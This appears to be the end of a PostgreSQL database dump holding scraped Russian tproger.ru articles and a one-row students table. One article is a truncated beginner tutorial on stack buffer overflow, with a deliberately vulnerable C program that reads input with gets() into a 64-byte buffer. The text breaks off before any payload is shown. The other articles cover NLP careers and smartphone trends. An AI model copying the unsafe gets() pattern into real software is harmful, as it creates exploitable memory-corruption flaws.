по-вашему достойно наибольшего внимания? Делитесь в комментариях.Напоминаем, что вырасскажем, как это сделать. 	https://tproger.ru/experts/if-you-missed-in-2018/	107
ece67b5c-32eb-11e9-9b69-28c2dd5a952f	Эксплуатация уязвимостей исполняемых файлов для новичков: переполнение буфера стека	Безопасность	В этой статье будет рассмотрена атака переполнения буфера стека, с подробным описанием того, что это такое, как это работает и какие технологии используются для её реализации. Статья написана так, чтобы тему смог понять мог даже неподготовленный читатель.Теория: память приложенийПри выполнении приложения загружаются в память. Но как мы все знаем, компьютеры имеют ограниченное количество памяти, и приложению нужно быть очень осторожным, чтобы не перезаписать область в памяти, принадлежащую другому приложению. Для того, чтобы избежать такой ситуации, используется так называемая виртуальная память, которую можно прекрасно описать с помощью сцены из сериала, выпущенного в начале 2000-х  внешние (т. е. не хранятся в исполняемом файле запускаемого приложения) системные или специально написанные библиотеки, которыми пользуется приложение. Пример представлен ниже.int main()\n{\n    printf(\n\n    return 0;\n}Как вы видите, нигде в этой шестистрочной программе не объявляется printf(). Однако эта программа всё равно запустится без ошибок и выведет  первым вышел).Стек используется программами для хранения различных вещей, например, указателей на функции и переменных.Теория: вызов функций и возвратыПосмотрите на код, представленный ниже:int add(int A, int B){\n    return A + B;\n}\nint main(){\n    add(1, 2);\n}В этом фрагменте кода мы видим что функция add() принимает два аргумента целочисленного типа, имена которых А и В. В функции main() мы вызываем функцию add() с 1 в качестве аргумента А и 2  В. Если перевести это в машинный код:push 2\npush 1\ncall addКак вы видите, при вызове функции с параметрами программа сначала добавляет оба параметра в стек, а затем выполняет команду call. Команда call перенаправляет указатель инструкции программы по адресу вызываемой функции. Указатель программы подобен маленькому карандашу, который вы используете для отслеживания слов при чтении. Указатель инструкции всегда указывает на ту инструкцию, которая должна быть выполнена (слово, которое будет прочитано). Однако, перед тем, как перейти к вызываемой функции, команда call помещает адрес следующей за ним инструкции в стек, чтобы, когда произойдёт возврат из функции add(), было известно, с чего продолжать выполнение программы. Адрес места, в которое функция должна вернуться, называется указателем возврата функции.Атака: переполнение буфера стекаПрежде чем углубляться в технические подробности о том, что такое переполнение стекового буфера и как оно работает, давайте рассмотрим простую для понимания аналогию:Алиса и Боб раньше встречались, но в итоге Алиса рассталась с Бобом. Время шло, Алиса оставила прошлое позади, но Бобу так и не удалось справиться с горем. Теперь Алиса выходит замуж за Роберта Хакермана, заклятого врага Боба. Боб, будучи жутким чудаком, следил за всеми свадебными планами Алисы благодаря своему секретному доступу к электронной почте Алисы. Боб увидел, что Алиса наняла известного дизайнера свадебных тортов, который хотел, чтобы Алиса отредактировала части своего рецепта под свои вкусовые предпочтения. Дизайнер дал Алисе рекомендованный список ингредиентов, которые можно добавить, но сказал, что сделает всё в точности, как она захочет. Боб открыл документ, прикреплённый к электронному письму дизайнера, и увидел, что меняемые строки рецепта выглядят так:… Затем мы наделим глазурь вкусом, добавив _____. После этого мы добавим немного шоколада …Боб заметил, что если ввести \n#include \n#include \n\nint main(int argc, char **argv)\n{\n    volatile int modified;\n    char buffer[64];\n\n    modified = 0;\n    gets(buffer);\n   \n    if(modified != 0) {\n        printf(\n    } else {\n        printf(\n    }\n}В приведённой выше функции мы видим, что массив символьного типа с именем buffer создаётся с размером 64. Затем мы видим, что переменная modified равна 0, и функция gets() вызывается с переменной buffer в качестве аргумента. Наконец, мы видим оператор IF, который проверяет, не равно ли значение modified нулю. Очевидно, что нет, где в этом приложении переменная modified имеет значение, отличное от 0. Так как мы собираемся её изменить?Что ж, давайте сначала посмотрим на документацию функции gets():Определение функции gets()Описание багов в функции gets()Как видите, функция gets() просто принимает пользовательский ввод. Однако функция не проверяет, действительно ли пользовательский ввод вписывается в структуру данных, в которой мы его храним (в данном случае это buffer), и, таким образом, мы можем переполнить структуру данных и повлиять на другие переменные и данные стека. Кроме того, поскольку мы знаем, что все переменные хранятся в стеке, и мы знаем, что представляет собой переменная modified (0), всё, что нам нужно сделать,  Part 1\nВарвара Николаева Безопасность	https://tproger.ru/translations/binary-exploitation-buffer-overflow/	107
ed05980c-32eb-11e9-9b69-28c2dd5a952f	NLP: как стать специалистом по обработке естественного языка		Рассказывает Александра КирпичниковаВместе с развитием сферы Data Science растёт и востребованность в кадрах для этой отрасли. Как же стать специалистом в такой части анализа данных, как обработка естественного языка (Natural Language Processing)?Кадровый рынок в этой сфере пока не очень большой. Хотя вакансий по Data Science кажется довольно много, задачи NLP встречаются в запросах работодателей достаточно редко. И в основном специалистов по обработке естественного языка ищут компании в крупных городах  обзорный курс от Санкт-Петербургского Политеха, частично посвящённый анализу текста. Запись на этот курс сейчас закрыта, как и на многие другие из приведенных выше, которые уже идут сейчас или недавно завершились. Но можно подписаться на обновления о курсе, чтобы не пропустить следующий набор.	https://tproger.ru/blogs/nlp-professional-howto/	107
ed22dc32-32eb-11e9-9b69-28c2dd5a952f	Чем нас будут удивлять производители смартфонов в 2019 году		2018 год был не лучшим для смартфонов. Впервые за долгое время рост этого рынка начал замедляться, хотя ещё пару лет назад в это сложно было бы поверить.Год не задался с самого начала. Уже в феврале консалтинговая компания Gartner зафиксировала первый спад, с тех пор как начала следить за этой областью. Даже всемогущий Apple был подвержен этой негативной тенденции. 18 декабря рынок обвалился, после того как влиятельный аналитик Ming-Chi Kuo озвучил свои пессимистичные прогнозы по продажам смартфонов на 2019 год.Люди перестали менять свои смартфоны так часто, как прежде. Отчасти от того, что флагманы удовлетворяют пользователей практически во всех отношениях, и уже нет острой надобности бежать за новинкой. Гонкой за характеристиками производители загнали себя в угол.Разумеется, это не означает, что производителиШорустам Шоумаров	https://tproger.ru/translations/smartphone-trends-2019/	107
\.


--
-- Data for Name: students; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.students (id, name, surname, mygroup) FROM stdin;
107	Камиль	Каримов	11-502
\.


--
-- Name: articles articles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.articles
    ADD CONSTRAINT articles_pkey PRIMARY KEY (id);


--
-- Name: students students_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.students
    ADD CONSTRAINT students_pkey PRIMARY KEY (id);


--
-- PostgreSQL database dump complete
--

